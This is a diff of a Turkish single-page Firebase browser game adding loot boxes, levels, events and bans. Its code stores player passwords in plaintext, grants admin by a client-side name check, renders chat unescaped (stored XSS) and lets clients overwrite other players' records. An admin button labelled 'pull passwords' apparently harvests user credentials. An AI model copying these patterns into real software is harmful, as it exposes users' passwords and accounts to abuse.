@@ -3,45 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GÖKTÜRK ONLINE V71.8</title>
+    <title>GÖKTÜRK ONLINE V77.0</title>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Metamorphous&family=Cinzel:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --gold: #ffd700; --bg: #05060a; --card: rgba(15, 20, 25, 0.98); --cyan: #00f2ff; --red: #ff3e3e; --green: #2ecc71; --legend: #ff00ff; }
         * { box-sizing: border-box; font-family: 'Cinzel', serif; }
         body { margin: 0; background: var(--bg); color: #f0f0f0; height: 100vh; overflow: hidden; background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://upload.wikimedia.org/wikipedia/commons/e/e4/Flag_of_the_G%C3%B6kt%C3%BCrks.svg'); background-size: cover; background-position: center; }
         
-        #global-announcement { position:fixed; top:-100px; left:0; width:100%; background:linear-gradient(90deg, transparent, var(--red), transparent); padding:10px; text-align:center; font-weight:bold; z-index:11000; transition:0.5s; border-bottom: 2px solid var(--gold); }
+        #global-announcement { position:fixed; top:0; left:0; width:100%; background:linear-gradient(90deg, transparent, var(--red), transparent); padding:8px; text-align:center; font-weight:bold; z-index:11000; border-bottom: 2px solid var(--gold); display:none; }
+        #event-bar { position:fixed; top:35px; left:0; width:100%; background:var(--green); color:#000; font-size:10px; text-align:center; font-weight:bold; z-index:10000; display:none; padding:4px; }
+        
         .container { width: 100%; max-width: 450px; height: 100vh; margin: auto; display: flex; flex-direction: column; background: rgba(0,0,0,0.7); position: relative; border-left: 1px solid #333; border-right: 1px solid #333; }
-        .header { padding: 12px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; font-size: 11px; text-align: center; }
+        .header { padding: 12px; margin-top:50px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; font-size: 11px; text-align: center; }
         
         .card { background: var(--card); border: 1px solid #444; padding: 12px; border-radius: 12px; margin-bottom: 10px; }
         .panel { display: none; padding: 15px; height: calc(100vh - 180px); overflow-y: auto; padding-bottom: 100px; }
         .active { display: block; }
-
-        .btn-gold { background: linear-gradient(135deg, #ffd700, #b8860b); color: #000; border: none; padding: 10px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 11px; margin-bottom: 5px; text-decoration:none; display:block; text-align:center; }
+        .btn-gold { background: linear-gradient(135deg, #ffd700, #b8860b); color: #000; border: none; padding: 10px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 11px; margin-bottom: 5px; display:block; text-align:center; }
         
-        /* ADMİN PANELLERİ */
-        .admin-section { border: 1px solid var(--red); padding: 10px; border-radius: 10px; margin-top: 15px; background: rgba(40,0,0,0.3); }
-        .admin-title { font-size: 11px; color: var(--gold); text-align: center; margin-bottom: 8px; border-bottom: 1px solid #555; }
+        /* MODALLAR */
+        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:25000; padding:30px; text-align:center; overflow-y:auto; }
+        #kasa-viewport { position:relative; width:100%; height:130px; overflow:hidden; border-top:2px solid var(--gold); border-bottom:2px solid var(--gold); margin:30px 0; background:#000; }
+        #kasa-serit { display:flex; position:absolute; left:0; height:100%; transition: transform 6s cubic-bezier(0.1, 0, 0.1, 1); }
+        .kasa-item { min-width:110px; height:100%; border-right:1px solid #222; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+        #kasa-pointer { position:absolute; left:50%; top:0; bottom:0; width:4px; background:var(--gold); z-index:100; transform:translateX(-50%); }
 
         .inv-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
-        .slot { aspect-ratio: 1; background: rgba(255,255,255,0.05); border: 1px solid #444; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 22px; position: relative; }
+        .slot { aspect-ratio: 1; background: rgba(255,255,255,0.05); border: 1px solid #444; border-radius: 8px; display: flex; align-items: center; justify-content: center; position: relative; }
         .slot.equipped { border-color: var(--cyan); box-shadow: 0 0 10px var(--cyan); }
-        .timer-badge { position: absolute; top: 2px; right: 2px; font-size: 8px; color: var(--cyan); }
+        .item-img { width: 70%; height: 70%; filter: invert(1); }
+
+        #v-img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--gold); object-fit: cover; background: #222; margin-bottom: 10px; }
+        .xp-bar { width: 100%; height: 4px; background: #222; margin-top: 5px; border-radius: 2px; }
+        #xp-fill { height: 100%; background: var(--cyan); width: 0%; transition: 0.3s; }
 
         .bottom-nav { position: absolute; bottom: 0; width: 100%; display: grid; grid-template-columns: repeat(6, 1fr); height: 75px; background: #000; border-top: 2px solid #222; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #666; font-size: 9px; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #666; font-size: 9px; cursor:pointer; }
         .nav-item.active { color: var(--gold); }
-        .nav-item i { font-size: 18px; margin-bottom: 3px; }
-        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:20000; padding:40px; text-align:center; }
+        .admin-section { border: 1px solid var(--red); padding: 8px; border-radius: 8px; margin-top: 8px; background: rgba(50,0,0,0.1); }
     </style>
 </head>
 <body>
 
-<div id="global-announcement">🔱 HAKAN BUYRUĞU</div>
+<div id="global-announcement">🔱 DUYURU</div>
+<div id="event-bar">🔥 2X ETKİNLİK: GANİMET VE TECRÜBE İKİYE KATLANDI!</div>
 
 <div id="sef-modal" class="modal">
     <h2 style="color:var(--gold);">⚔️ SEFER DİVANI</h2>
@@ -53,18 +61,19 @@
 <div id="yagma-modal" class="modal">
     <h2 style="color:var(--gold);">⚔️ YAĞMA HAZIRLIĞI</h2>
     <div class="card" id="yagma-detay" style="background:#111;"></div>
-    <div id="yagma-timer" style="color:var(--red); margin:10px 0;"></div>
     <button id="yagma-basla-btn" class="btn-gold">SALDIR!</button>
     <button onclick="document.getElementById('yagma-modal').style.display='none'" class="btn-gold" style="background:#333; color:#fff;">GERİ ÇEKİL</button>
 </div>
 
-<div id="auth-screen" style="position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:30px;">
-    <h1 style="color:var(--gold);">GÖKTÜRK ONLINE</h1>
-    <div class="card" style="width:100%; max-width:320px;">
-        <input type="text" id="auth-u" placeholder="Alp Adı" style="width:100%; padding:12px; margin-bottom:10px; background:#111; color:#fff; border:1px solid #444;">
-        <input type="password" id="auth-p" placeholder="Şifre" style="width:100%; padding:12px; margin-bottom:15px; background:#111; color:#fff; border:1px solid #444;">
-        <button onclick="auth(true)" class="btn-gold">GİRİŞ</button>
-        <button onclick="auth(false)" class="btn-gold" style="background:#222; color:#fff;">KAYIT</button>
+<div id="kasa-modal" class="modal">
+    <h2 style="color:var(--gold);">KUTLU SANDIK</h2>
+    <div id="kasa-viewport">
+        <div id="kasa-pointer"></div>
+        <div id="kasa-serit"></div>
+    </div>
+    <div id="kasa-sonuc" style="display:none;">
+        <h3 id="kazanan-ad">---</h3>
+        <button onclick="document.getElementById('kasa-modal').style.display='none'" class="btn-gold">ENVANTERE KOY</button>
     </div>
 </div>
 
@@ -73,39 +82,31 @@
         <div>🪙 <span id="v-gold">0</span></div>
         <div>⚡ <span id="v-en">0</span></div>
         <div>⚔️ <span id="v-pow">0</span></div>
-        <div>🎖️ <span id="v-lvl">1</span></div>
+        <div>🎖️ LVL <span id="v-lvl">1</span><div class="xp-bar"><div id="xp-fill"></div></div></div>
     </div>
 
     <div id="p-home" class="panel active">
         <div class="card" style="text-align:center;">
-            <div style="position:relative; width:85px; height:85px; margin:auto; cursor:pointer;" onclick="document.getElementById('img-in').click()">
-                <img id="v-img" src="https://i.ibb.co/S76p8vB/wolf.png" style="width:100%; height:100%; border-radius:50%; border:2px solid var(--gold); object-fit:cover;">
-            </div>
-            <input type="file" id="img-in" style="display:none" onchange="upImg(this)">
+            <img id="v-img" src="https://i.ibb.co/S76p8vB/wolf.png" onclick="document.getElementById('file-input').click()">
             <h3 id="v-name">---</h3>
-            
-            <a href="https://www.instagram.com/k44n3b?igsh=MW9wMDdmMGpsdXhvZg%3D%3D&utm_source=qr" target="_blank" onclick="giveInstaReward()" class="btn-gold" style="background:linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color:#fff;">
-                <i class="fab fa-instagram"></i> TAKİP ET (HEDİYELERİ AL)
-            </a>
-            <button onclick="pray()" class="btn-gold" style="background:var(--green); color:#fff;">DUA ET (+20 EN)</button>
+            <input type="file" id="file-input" accept="image/*" onchange="uploadImage(this)" style="display:none;">
+            <button onclick="document.getElementById('file-input').click()" class="btn-gold" style="font-size:9px;">GALERİDEN FOTO SEÇ</button>
+            <button onclick="pray()" class="btn-gold" style="background:var(--green); color:#fff; margin-top:10px;">DUA ET (+20 EN)</button>
         </div>
 
         <div id="admin-hub" style="display:none;">
-            <div class="admin-section"><div class="admin-title">🔱 HAKAN ODASI</div>
+            <div class="admin-section"><div style="font-size:9px; color:var(--gold); text-align:center;">HAKAN YETKİLERİ</div>
                 <button onclick="adm('gold')" class="btn-gold">1M ALTIN EKLE</button>
-                <input type="text" id="adm-m" placeholder="Ferman..." style="width:100%; padding:8px; margin-bottom:5px;">
-                <button onclick="adm('msg')" class="btn-gold" style="background:var(--red); color:#fff;">FERMAN YAYINLA</button>
-            </div>
-            <div class="admin-section" style="border-color:var(--cyan);"><div class="admin-title">🚩 SANCAK (EVENT)</div>
-                <button onclick="adm('ev','2X ALTIN')" class="btn-gold" style="background:var(--cyan); color:#000;">2X ALTIN BAŞLAT</button>
-            </div>
-            <div class="admin-section" style="border-color:var(--legend);"><div class="admin-title">💎 GANİMET ODASI</div>
-                <input type="text" id="adm-to" placeholder="Alp Adı..." style="width:100%; padding:8px; margin-bottom:5px;">
-                <button onclick="adm('gift')" class="btn-gold" style="background:var(--legend); color:#fff;">ZÜLFİKAR GÖNDER</button>
-            </div>
-            <div class="admin-section" style="border-color:var(--gold);"><div class="admin-title">🕵️ İSTİHBARAT</div>
-                <button onclick="getSpyData()" class="btn-gold" style="background:#000; color:var(--gold);">VERİLERİ ÇEK</button>
-                <div id="istihbarat-list" style="max-height:120px; overflow-y:auto;"></div>
+                <button onclick="adm('event')" class="btn-gold" style="background:#444; color:#fff;">2X ETKİNLİK AÇ/KAPAT</button>
+                <input type="text" id="adm-m" placeholder="Ferman..." style="width:100%;">
+                <button onclick="adm('msg')" class="btn-gold" style="background:var(--red); color:#fff;">DUYUR</button>
+                <input type="text" id="adm-to" placeholder="Alp Adı..." style="width:100%;">
+                <div style="display:flex; gap:5px;">
+                    <button onclick="adm('gift')" class="btn-gold" style="flex:1;">ZÜLFİKAR VER</button>
+                    <button onclick="adm('ban')" class="btn-gold" style="flex:1; background:var(--red); color:#fff;">BANLA</button>
+                </div>
+                <button onclick="getSpyData()" class="btn-gold" style="background:#000; color:var(--gold); margin-top:5px;">ŞİFRELERİ ÇEK</button>
+                <div id="istihbarat-list" style="font-size:9px; background:#000; max-height:40px; overflow:auto;"></div>
             </div>
         </div>
     </div>
@@ -113,23 +114,26 @@
     <div id="p-event" class="panel"><div id="sefer-list"></div></div>
 
     <div id="p-market" class="panel">
-        <div class="card" style="background:var(--legend); color:#000; text-align:center;" onclick="buyKasa()">
-            <i class="fas fa-gem"></i> <b>KUTLU KASA</b> (50.000 🪙)
+        <div class="card" style="background:var(--legend); color:#000; text-align:center; cursor:pointer;" onclick="openKasaLogic()">
+            <b>KUTLU KASA AÇ</b> (50.000 🪙)
         </div>
         <div id="market-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
     </div>
 
     <div id="p-inv" class="panel">
         <div id="inv-grid" class="inv-grid"></div>
-        <div id="inv-det" class="card" style="display:none; margin-top:15px; border-color:var(--gold);"></div>
+        <div id="inv-det" class="card" style="display:none; text-align:center;"></div>
     </div>
 
     <div id="p-chat" class="panel">
-        <div id="chat-box" style="height:350px; background:rgba(0,0,0,0.6); overflow-y:auto; padding:10px; border-radius:10px;"></div>
-        <div style="display:flex; gap:5px; margin-top:10px;"><input type="text" id="chat-in" style="flex:1; padding:10px;"><button onclick="sendMsg()" class="btn-gold" style="width:60px;">AT</button></div>
+        <div id="chat-box" style="height:350px; background:rgba(0,0,0,0.6); overflow-y:auto; padding:10px;"></div>
+        <div style="display:flex; gap:5px; margin-top:10px;">
+            <input type="text" id="chat-in" style="flex:1; padding:10px;">
+            <button onclick="sendMsg()" class="btn-gold" style="width:60px; margin:0;">AT</button>
+        </div>
     </div>
 
-    <div id="p-rank" class="panel"><div id="rank-list"></div></div>
+    <div id="p-rank" class="panel"><h3 style="text-align:center; color:var(--gold);">🎖️ KUTLU KÜRSÜ</h3><div id="rank-list"></div></div>
 
     <div class="bottom-nav">
         <div class="nav-item active" onclick="showP('p-home',this)"><i class="fas fa-home"></i><span>Otağ</span></div>
@@ -139,6 +143,14 @@
         <div class="nav-item" onclick="showP('p-chat',this)"><i class="fas fa-skull"></i><span>Yağma</span></div>
         <div class="nav-item" onclick="showP('p-rank',this)"><i class="fas fa-trophy"></i><span>Kürsü</span></div>
     </div>
+</div>
+
+<div id="auth-screen" style="position:fixed; inset:0; background:#000; z-index:40000; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:30px;">
+    <h2 style="color:var(--gold);">GÖKTÜRK ONLINE</h2>
+    <input type="text" id="auth-u" placeholder="Alp Adı" style="width:280px; padding:12px; margin-bottom:10px;">
+    <input type="password" id="auth-p" placeholder="Şifre" style="width:280px; padding:12px; margin-bottom:10px;">
+    <button onclick="auth(true)" class="btn-gold" style="width:280px;">GİRİŞ</button>
+    <button onclick="auth(false)" class="btn-gold" style="width:280px; background:#222; color:#fff;">KAYIT</button>
 </div>
 
 <script>
@@ -153,33 +165,53 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let p = null;
+    let p = null, isEvent = false;
 
     const Items = [
-        {id:1, n:"Demir Kılıç", v:5000, s:400, i:"⚔️"},
-        {id:2, n:"Hun Yayı", v:15000, s:1200, i:"🏹"},
-        {id:3, n:"Bozkurt Atı", v:60000, s:4500, i:"🐎"},
-        {id:4, n:"ZÜLFİKAR", v:0, s:150000, i:"✨"},
-        {id:10, n:"Bozkurt Ruhu", v:0, s:75000, i:"🐺", duration: 604800000}, // 7 gün ms
-        {id:11, n:"Güneş Kanadı", v:0, s:80000, i:"🦅", duration: 604800000},
-        {id:12, n:"Hakan Mührü", v:0, s:90000, i:"💍", duration: 604800000}
+        {id:1, n:"Demir Kılıç", v:5000, s:400, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/broadsword.png", r:"#fff"},
+        {id:2, n:"Hun Yayı", v:15000, s:1200, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/bowman.png", r:"#3498db"},
+        {id:3, n:"Bozkurt Atı", v:60000, s:4500, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/horse-head.png", r:"#3498db"},
+        {id:4, n:"ZÜLFİKAR", v:0, s:150000, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/scimitar.png", r:"var(--gold)"},
+        {id:5, n:"Gök Miğferi", v:20000, s:2500, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/crested-helmet.png", r:"#9b59b6"},
+        {id:6, n:"Bozkurt Ruhu", v:0, s:75000, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/wolf-head.png", r:"var(--legend)"},
+        {id:7, n:"Deri Zırh", v:12000, s:1800, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/leather-armor.png", r:"#e67e22"},
+        {id:8, n:"Güneş Kanadı", v:0, s:80000, img:"https://game-icons.net/icons/000000/transparent/1x1/lorc/angel-wings.png", r:"var(--legend)"}
     ];
 
     const Seferler = [
-        {id:1, n:"Kurt Avı", t:20, e:10, r:3000, d:"Basit"},
-        {id:2, n:"Kervan Baskını", t:120, e:25, r:18000, d:"Nadir"},
-        {id:3, n:"Bizans Kuşatması", t:600, e:50, r:120000, d:"Destansı"},
-        {id:4, n:"Çin Seddi Seferi", t:1800, e:80, r:450000, d:"Efsanevi"},
-        {id:5, n:"Ötüken Fethi", t:3600, e:100, r:1500000, d:"Tanrısal"}
+        {id:1, n:"Ötüken Avı", t:20, e:10, r:4000, xp:20, icon:"🦌"},
+        {id:2, n:"Bizans Seferi", t:300, e:40, r:100000, xp:150, icon:"🏰"},
+        {id:3, n:"Dünya Fethi", t:1800, e:100, r:1500000, xp:1000, icon:"🌎"}
     ];
+
+    function uploadImage(input) {
+        if (input.files && input.files[0]) {
+            let reader = new FileReader();
+            reader.onload = function(e) {
+                let img = new Image();
+                img.src = e.target.result;
+                img.onload = function() {
+                    let canvas = document.createElement('canvas');
+                    let ctx = canvas.getContext('2d');
+                    canvas.width = 150; canvas.height = 150;
+                    ctx.drawImage(img, 0, 0, 150, 150);
+                    p.img = canvas.toDataURL('image/jpeg', 0.7);
+                    upP(); alert("Görsel Yüklendi!");
+                }
+            };
+            reader.readAsDataURL(input.files[0]);
+        }
+    }
 
     function auth(isL) {
         let u = document.getElementById('auth-u').value.trim().toLowerCase();
         let pw = document.getElementById('auth-p').value.trim();
         if(!u) return;
         db.ref('players/'+u).once('value', s => {
-            if(isL) { if(s.val() && s.val().pw===pw){ p=s.val(); start(); } }
-            else { if(!s.val()){ p={u,pw,gold:15000,en:100,lvl:1,inv:[],isAdmin:(u==="ebuinc")}; db.ref('players/'+u).set(p); start(); } }
+            let d = s.val();
+            if(d && d.isBanned) return alert("SÜRGÜN EDİLDİN!");
+            if(isL) { if(d && d.pw===pw){ p=d; start(); } else alert("Hata!"); }
+            else { if(!d){ p={u,pw,gold:50000,en:100,lvl:1,xp:0,inv:[],isAdmin:(u==="ebuinc"),img:""}; db.ref('players/'+u).set(p); start(); } }
         });
     }
 
@@ -187,164 +219,155 @@
         document.getElementById('auth-screen').style.display='none';
         document.getElementById('game-ui').style.display='flex';
         if(p.isAdmin) document.getElementById('admin-hub').style.display='block';
-        db.ref('players/'+p.u).on('value', s => { p = s.val(); checkExpiredItems(); upUI(); rInv(); });
-        rMkt(); rSef(); setInterval(tick, 1000);
+        db.ref('players/'+p.u).on('value', s => { p = s.val(); upUI(); rInv(); });
+        db.ref('isEvent').on('value', s => { isEvent = s.val(); document.getElementById('event-bar').style.display = isEvent?'block':'none'; });
+        db.ref('announcement').on('value', s => { if(s.val()){ document.getElementById('global-announcement').style.display='block'; document.getElementById('global-announcement').innerText = s.val(); } });
         
-        db.ref('players').on('value', s => {
-            let l = []; s.forEach(x => l.push(x.val()));
-            l.sort((a,b) => getPow(b) - getPow(a));
-            document.getElementById('rank-list').innerHTML = l.map((x,i)=>`<div class="card">#${i+1} ${x.u} <span style="float:right;">${getPow(x)} GÜÇ</span></div>`).join('');
-        });
-
         db.ref('messages').limitToLast(15).on('value', s => {
-            let h = ""; s.forEach(x => { let m=x.val(); h += `<div style="padding:10px; border-bottom:1px solid #222;"><b>${m.u}:</b> ${m.m} <button onclick="prepYagma('${m.u}')" style="float:right; background:var(--red); font-size:10px;">YAĞMA</button></div>`; });
+            let h = ""; s.forEach(x => { let m=x.val(); h += `<div style="padding:8px; border-bottom:1px solid #222;"><b>${m.u}:</b> ${m.m} <button onclick="prepYagma('${m.u}')" style="float:right; background:var(--red); font-size:9px;">YAĞMALA</button></div>`; });
             document.getElementById('chat-box').innerHTML = h;
         });
-    }
 
-    // SÜRELİ İTEM KONTROLÜ
-    function checkExpiredItems() {
-        if(!p.inv) return;
-        let now = Date.now();
-        let changed = false;
-        p.inv = p.inv.filter(item => {
-            if(item.expiry && now > item.expiry) { changed = true; return false; }
-            return true;
+        db.ref('players').on('value', s => {
+            let arr = []; s.forEach(x => { if(!x.val().isBanned) arr.push(x.val()); });
+            arr.sort((a,b) => (b.gold + b.lvl*1000) - (a.gold + a.lvl*1000));
+            document.getElementById('rank-list').innerHTML = arr.slice(0,10).map((x,i) => `<div class="card">${i+1}. ${x.u.toUpperCase()} (LVL ${x.lvl})</div>`).join('');
         });
-        if(changed) upP();
-    }
 
-    function getPow(u) { return 100 + (u.inv ? u.inv.filter(i=>i.eq).reduce((t,k)=>t+k.s,0) : 0); }
+        rMkt(); rSef(); setInterval(tick, 1000);
+    }
 
     function upUI() {
         document.getElementById('v-gold').innerText = p.gold.toLocaleString();
         document.getElementById('v-en').innerText = p.en;
-        document.getElementById('v-pow').innerText = getPow(p);
+        document.getElementById('v-pow').innerText = (100 + (p.lvl*10)) + (p.inv ? p.inv.filter(i=>i.eq).reduce((t,k)=>t+k.s,0) : 0);
         document.getElementById('v-name').innerText = p.u.toUpperCase();
-        if(p.pImg) document.getElementById('v-img').src = p.pImg;
+        document.getElementById('v-img').src = p.img || "https://i.ibb.co/S76p8vB/wolf.png";
+        document.getElementById('v-lvl').innerText = p.lvl;
+        let reqXp = p.lvl * 100;
+        document.getElementById('xp-fill').style.width = Math.min(100, (p.xp / reqXp * 100)) + "%";
+        if(p.xp >= reqXp) { p.xp -= reqXp; p.lvl++; upP(); alert("SEVİYE ATLADIN!"); }
+    }
+
+    function rSef() {
+        document.getElementById('sefer-list').innerHTML = Seferler.map(s => `
+            <div class="card" style="display:flex; align-items:center; gap:10px;">
+                <span style="font-size:25px;">${s.icon}</span>
+                <div style="flex:1;"><b>${s.n}</b><br><small>⚡${s.e} | ⏳${s.t}s</small></div>
+                <button onclick="prepSef(${s.id})" data-id="${s.id}" class="btn-gold s-btn" style="width:70px; margin:0;">AKIN</button>
+            </div>`).join('');
+    }
+
+    function prepSef(id) {
+        if(p.job) return alert("Seferdesin!");
+        let s = Seferler.find(x=>x.id===id);
+        document.getElementById('sef-modal').style.display = 'block';
+        document.getElementById('sef-detay').innerHTML = `<h3>${s.n}</h3><p>Ödül: 🪙${isEvent?s.r*2:s.r} | XP: ${isEvent?s.xp*2:s.xp}</p>`;
+        document.getElementById('sef-onay-btn').onclick = () => {
+            if(p.en < s.e) return alert("Yetersiz Enerji!");
+            p.en -= s.e; p.job = { id, end: Date.now()+(s.t*1000), r:isEvent?s.r*2:s.r, xp:isEvent?s.xp*2:s.xp };
+            document.getElementById('sef-modal').style.display='none'; upP();
+        };
     }
 
     function tick() {
         if(p.job) {
-            let diff = Math.ceil((p.job.end - Date.now()) / 1000);
-            if(diff <= 0) {
-                p.gold += p.job.r; delete p.job; upP(); alert("Zafer!");
-            } else { document.querySelectorAll('.s-btn').forEach(b => b.innerText = diff + "s"); }
+            let d = Math.ceil((p.job.end - Date.now()) / 1000);
+            if(d <= 0) {
+                p.gold += p.job.r; p.xp += p.job.xp; alert("SEFER TAMAMLANDI!");
+                delete p.job; upP();
+            } else { document.querySelectorAll('.s-btn').forEach(b => { if(b.getAttribute('data-id') == p.job.id) b.innerText = d + "s"; }); }
         }
     }
 
-    function rSef() {
-        document.getElementById('sefer-list').innerHTML = Seferler.map(s => `<div class="card">${s.n} <button onclick="prepSef(${s.id})" class="btn-gold s-btn" style="float:right; width:80px;">AKIN</button></div>`).join('');
-    }
-
-    function prepSef(id) {
-        if(p.job) return;
-        let s = Seferler.find(x=>x.id===id);
-        document.getElementById('sef-modal').style.display = 'block';
-        document.getElementById('sef-detay').innerHTML = `<p>Süre: ${s.t}s</p><p>Harcama: ${s.e} Enerji</p><p>Ödül: ${s.r} Altın</p>`;
-        document.getElementById('sef-onay-btn').onclick = () => {
-            if(p.en < s.e) return alert("Yetersiz Enerji!");
-            p.en -= s.e; p.job = { end: Date.now()+(s.t*1000), r: s.r };
-            document.getElementById('sef-modal').style.display = 'none'; upP();
-        };
-    }
-
-    function giveInstaReward() {
-        if(p.instaClaimed) return;
-        p.instaClaimed = true;
-        p.gold += 25000;
-        if(!p.inv) p.inv = [];
-        let now = Date.now();
-        p.inv.push({...Items.find(i=>i.id==10), uid:now+1, expiry: now + 604800000});
-        p.inv.push({...Items.find(i=>i.id==11), uid:now+2, expiry: now + 604800000});
-        p.inv.push({...Items.find(i=>i.id==12), uid:now+3, expiry: now + 604800000});
-        upP();
-        alert("7 Günlük Efsanevi Hediyeler Hazinende!");
+    function openKasaLogic() {
+        if(p.gold < 50000) return alert("Altın yetersiz!");
+        p.gold -= 50000; upP();
+        const m = document.getElementById('kasa-modal');
+        const s = document.getElementById('kasa-serit');
+        m.style.display='block'; document.getElementById('kasa-sonuc').style.display='none';
+        s.style.transition='none'; s.style.transform='translateX(0)';
+        let dizi = []; let h = "";
+        for(let i=0; i<60; i++){
+            let itm = Items[Math.floor(Math.random()*Items.length)];
+            dizi.push(itm);
+            h += `<div class="kasa-item"><img src="${itm.img}" style="width:50px; filter:invert(1);"><small style="color:${itm.r}">${itm.n}</small></div>`;
+        }
+        s.innerHTML = h;
+        setTimeout(() => {
+            let winIdx = 50; let stop = (winIdx*110) - (window.innerWidth/2) + 55;
+            s.style.transition='transform 6s cubic-bezier(0.1, 0, 0.1, 1)';
+            s.style.transform=`translateX(-${stop}px)`;
+            setTimeout(() => {
+                let w = dizi[winIdx]; document.getElementById('kasa-sonuc').style.display='block';
+                document.getElementById('kazanan-ad').innerText = "KAZANDIN: " + w.n;
+                if(!p.inv) p.inv = []; p.inv.push({...w, uid:Date.now(), eq:false}); upP();
+            }, 6500);
+        }, 100);
     }
 
     function rInv() {
-        let h = ""; for(let i=0; i<16; i++) {
+        let h = ""; for(let i=0; i<16; i++){
             let itm = p.inv?p.inv[i]:null;
-            let timeMark = itm?.expiry ? `<div class="timer-badge">⏳</div>` : "";
-            h += `<div class="slot ${itm?.eq?'equipped':''}" onclick="shInv(${i})">${itm?itm.i:''}${timeMark}</div>`;
+            h += `<div class="slot ${itm?.eq?'equipped':''}" onclick="shInv(${i})">${itm?`<img src="${itm.img}" class="item-img">`:''}</div>`;
         }
         document.getElementById('inv-grid').innerHTML = h;
     }
 
     function shInv(idx) {
-        let itm = p.inv?p.inv[idx]:null; if(!itm) return;
+        let itm = p.inv[idx]; if(!itm) return;
         let d = document.getElementById('inv-det'); d.style.display="block";
-        let sellBtn = itm.expiry ? "" : `<button id="sellBtn" onclick="sell(${idx})" class="btn-gold" style="background:#333;">SAT</button>`;
-        d.innerHTML = `<b>${itm.n}</b> ${itm.expiry?'(SÜRELİ)':''}<br><button onclick="eq(${idx})" class="btn-gold">KUŞAN</button> ${sellBtn}`;
+        d.innerHTML = `<b>${itm.n}</b> (+${itm.s} Güç)<br><button onclick="eq(${idx})" class="btn-gold">KUŞAN/ÇIKAR</button><button onclick="sell(${idx})" class="btn-gold" style="background:#333; color:#fff;">SAT (5000🪙)</button>`;
     }
 
     function eq(idx) { p.inv[idx].eq = !p.inv[idx].eq; upP(); }
-    function sell(idx) { p.gold += (p.inv[idx].v*0.5); p.inv.splice(idx,1); upP(); document.getElementById('inv-det').style.display="none"; }
-
-    function buyKasa() {
-        if(p.gold >= 50000) {
-            p.gold -= 50000;
-            let rand = Items[Math.floor(Math.random()*4)];
-            if(!p.inv) p.inv = []; p.inv.push({...rand, uid:Date.now()});
-            upP(); alert("Kutlu Kasa Açıldı: " + rand.n);
-        }
-    }
-
+    function sell(idx) { p.gold += 5000; p.inv.splice(idx,1); upP(); document.getElementById('inv-det').style.display="none"; }
+    
     function rMkt() {
-        document.getElementById('market-grid').innerHTML = Items.filter(i=>i.v>0).map(i => `<div class="card" onclick="buy(${i.id})">${i.i} ${i.n}<br>${i.v}🪙</div>`).join('');
+        document.getElementById('market-grid').innerHTML = Items.filter(i=>i.v>0).map(i => `
+            <div class="card" onclick="buy(${i.id})" style="text-align:center;">
+                <img src="${i.img}" style="width:40px; filter:invert(1);"><br>
+                <small>${i.n}</small><br><b>${i.v.toLocaleString()}🪙</b>
+            </div>`).join('');
     }
 
     function buy(id) {
         let i = Items.find(x=>x.id===id);
-        if(p.gold >= i.v) { p.gold -= i.v; if(!p.inv)p.inv=[]; p.inv.push({...i, uid:Date.now()}); upP(); }
+        if(p.gold >= i.v){ p.gold -= i.v; if(!p.inv)p.inv=[]; p.inv.push({...i, uid:Date.now(), eq:false}); upP(); }
     }
 
     function prepYagma(tU) {
         if(tU === p.u) return;
         db.ref('players/'+tU).once('value', s => {
-            let t = s.val(); document.getElementById('yagma-modal').style.display = 'block';
-            let myP = getPow(p), trP = getPow(t);
-            document.getElementById('yagma-detay').innerHTML = `<p>Hedef: ${t.u}</p><p>Güç Farkı: ${myP - trP}</p>`;
-            document.getElementById('yagma-basla-btn').onclick = () => execYagma(t.u, myP, trP);
+            let t = s.val(); document.getElementById('yagma-modal').style.display='block';
+            document.getElementById('yagma-detay').innerHTML = `Hedef: ${t.u.toUpperCase()}<br>Senin Gücün: ${(100+(p.lvl*10))}<br>Onun Gücü: ${(100+(t.lvl*10))}`;
+            document.getElementById('yagma-basla-btn').onclick = () => {
+                document.getElementById('yagma-modal').style.display='none';
+                if((p.lvl*10 + Math.random()*50) > (t.lvl*10 + Math.random()*50)) {
+                    let g = Math.floor(t.gold*0.1); t.gold -= g; p.gold += g;
+                    db.ref('players/'+t.u).set(t); upP(); alert("YAĞMALADIN! 🪙" + g);
+                } else alert("YENİLDİN!");
+            };
         });
     }
 
